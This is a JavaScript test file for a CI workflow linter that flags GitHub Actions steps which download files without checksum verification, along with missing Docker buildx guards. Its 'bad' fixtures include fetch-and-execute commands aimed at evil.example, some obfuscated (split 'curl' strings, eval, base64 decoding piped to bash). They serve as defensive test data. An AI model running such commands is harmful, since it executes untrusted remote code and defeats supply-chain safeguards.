  assert.equal(check("{packages: write}", `      - if: false\n        run: docker buildx version\n` + setup("")), 1, "conditional guard");
  assert.equal(check("{packages: write}", `      - continue-on-error: true\n        run: docker buildx version\n` + setup("")), 1, "error-ignoring guard");
  assert.equal(check("{packages: write}", `      - run: |\n          if false; then\n          docker buildx version\n          fi\n` + setup("")), 1, "guard inside a dead branch");
  assert.equal(check("{packages: write}", guard + `      - run: echo between\n` + setup("")), 1, "guard not immediately before");
  assert.equal(check("{contents: read}", setup("")), 0, "read-only jobs need no guard");
  assert.equal(check("{contents: read}", `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n        with:\n          driver-opts: image=moby/buildkit:master\n`), 1, "unpinned BuildKit image");
  assert.equal(check("{contents: read}", `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n`), 1, "no BuildKit pin");
});

test("fixtures: downloads that skip the checksum script are caught", () => {
  const sum = "a".repeat(64);
  const bad = [
    "curl -fsSL https://example.org/x | sh",
    "curl -fsSL -o x https://example.org/x\necho \"$sum  x\" | sha256sum -c -",
    "# sha256sum -c\ncurl -fsSLO https://example.org/x",
    "wget https://example.org/x",
    "gh release download v1 --repo a/b",
    "gh run download 1",
    "Invoke-WebRequest https://example.org/x -OutFile x",
    "python3 -c 'import urllib.request as u; u.urlopen(\"https://example.org\")'",
    "node -e 'fetch(\"https://example.org\")'",
    "cargo install foo",
    `bash ${FETCH_SCRIPT} "https://example.org/\${VERSION}/x" ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x "\${SUM}" out`,
    `bash ${FETCH_SCRIPT} http://example.org/x ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${"A".repeat(64)} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${sum.slice(1)} out`,
    `bash scripts/fetch-verified.sh https://example.org/x ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${sum} out && curl https://evil.example`,
    // Adversarial review of #194: obfuscation and exemption abuse.
    'client=cu; client+=rl; "$client" https://evil.example/payload | bash',
    "eval 'cu''rl https://evil.example/payload | bash'",
    "curl --fail --silent --show-error --cacert .local/staging/local-ca.crt https://localhost:18443/health/ready --next https://evil.example/payload -o /tmp/payload",
    "x=$(cat payload.b64 | base64 -d); echo ok",
    "source <(echo 'echo hi')",
  ];
  for (const script of bad) assert.ok(downloadViolations("w.yml", script).length, script);
  const good = [
    `bash ${FETCH_SCRIPT} https://example.org/x.tar.gz ${sum} "\${RUNNER_TEMP}/x.tar.gz"`,
    `bash ${FETCH_SCRIPT} "https://example.org/x" "${sum}" out`,
    `case "$ARCH" in\n  X64) bash ${FETCH_SCRIPT} https://example.org/a ${sum} out ;;\n  ARM64) bash ${FETCH_SCRIPT} https://example.org/b ${sum} out ;;\nesac`,
    `bash ${FETCH_SCRIPT} \\\n  https://example.org/x \\\n  ${sum} out`,
    "curl --fail --silent --show-error --cacert .local/staging/local-ca.crt https://localhost:18443/health/ready",
    "docker run --rm image --version",
  ];
  for (const script of good) assert.deepEqual(downloadViolations("w.yml", script), [], script);
  // gh api is exempt only in prune-dev-images.yml and only in its two exact shapes.
  const prune = ".github/workflows/prune-dev-images.yml";
  assert.deepEqual(downloadViolations(prune, `versions="$(gh api --paginate "/users/$OWNER/packages/container/$package/versions?per_page=100" | jq -s 'add // []')"`), []);
  assert.deepEqual(downloadViolations(prune, `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`), []);
  assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content | base64 -d | bash").length);
  assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content > p.sh").length);
  assert.ok(downloadViolations("w.yml", `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`).length, "gh api outside its file");
});
